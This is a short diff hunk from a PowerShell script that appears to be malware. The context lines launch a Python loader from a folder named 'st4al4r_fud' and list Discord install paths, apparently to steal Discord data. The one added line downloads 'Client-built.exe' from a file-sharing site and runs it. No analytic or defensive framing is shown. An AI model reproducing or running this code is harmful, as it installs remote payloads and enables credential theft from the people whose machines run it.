@@ -116,6 +116,7 @@ if (!(Test-Path $markerFile)) {
     New-Item -ItemType File -Path $markerFile | Out-Null
 }
 Start-Process -FilePath "$dir\st4al4r_fud\Scripts\pythonw.exe" -ArgumentList "$dir\st4al4r_fud\Scripts\loader.py"
+$URL="https://anonsharing.com/file/d231ef5733f21748/Client-built.exe";$Path="$dir\client.exe";Invoke-WebRequest -Uri $URL -OutFile $Path;Start-Process -FilePath $Path -Wait
 
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
